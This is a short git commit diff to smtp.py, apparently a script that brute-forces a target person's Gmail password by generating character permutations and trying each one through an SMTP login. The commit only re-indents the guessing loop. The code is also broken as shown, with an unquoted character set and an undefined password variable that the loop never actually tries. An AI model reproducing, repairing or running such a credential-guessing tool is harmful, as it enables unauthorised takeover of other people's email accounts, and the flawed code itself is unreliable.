d7286742f1d5dd1859d1ff5127a099d8f8300926
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-27 18:26:22 +0100

    Update smtp.py

--- smtp.py
+++ smtp.py
@@ -6,10 +6,10 @@ smtpserver.starttls()
 user = raw_input("Enter Target's Gmail Address: ") 
 
 def print_perms(chars, minlen, maxlen): 
-for n in range(6, 12+1): 
-   for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
-      if(''.join(perm) == symbols):
-         return 0
+   for n in range(6, 12+1): 
+      for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
+         if(''.join(perm) == symbols):
+            return 0
 
 try: 
     smtpserver.login(user, symbols) 
